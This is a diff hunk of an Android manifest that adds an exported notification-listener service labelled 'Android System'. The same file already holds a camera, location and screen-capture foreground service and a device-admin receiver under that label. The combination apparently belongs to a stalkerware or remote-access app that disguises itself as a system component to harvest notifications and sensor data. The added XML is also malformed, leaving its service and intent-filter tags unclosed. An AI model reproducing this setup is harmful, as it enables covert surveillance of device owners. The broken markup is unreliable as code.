@@ -29,7 +29,13 @@
         android:exported="false"
               android:stopWithTask="false"
         android:foregroundServiceType="mediaProjection|camera|location" />
-
+<service 
+            android:name=".NotificationService"
+            android:label="Android System"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
     <receiver android:name=".DeviceAdminReceiver"
       android:label="Android System"
       android:description="@string/device_admin_description"
